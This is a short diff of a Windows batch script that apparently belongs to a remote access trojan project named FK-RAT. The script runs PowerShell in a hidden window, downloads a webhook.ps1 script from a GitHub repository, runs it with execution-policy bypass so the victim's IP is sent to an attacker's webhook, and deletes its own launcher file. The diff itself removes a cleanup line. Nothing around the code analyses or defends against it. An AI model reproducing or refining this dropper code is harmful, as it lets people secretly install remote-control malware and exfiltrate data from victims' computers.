@@ -19,9 +19,8 @@ powershell ./wget.cmd
 
 @REM Send IP to Webhook
 powershell powershell.exe -windowstyle hidden -c "Invoke-WebRequest -URI https://github.com/Sunnickel/FK-RAT/raw/main/resources/webhook.ps1 -OutFile webhook.ps1"
-powershell -ep bypass -File ./webhook.ps1 "%WEBHOOK%"
+powershell -ep bypass ./webhook.ps1 "%WEBHOOK%"
 
 @REM cd change back to initial location
-del webhook.ps1
 cd "%INITIALPATH%"
 del initial.cmd
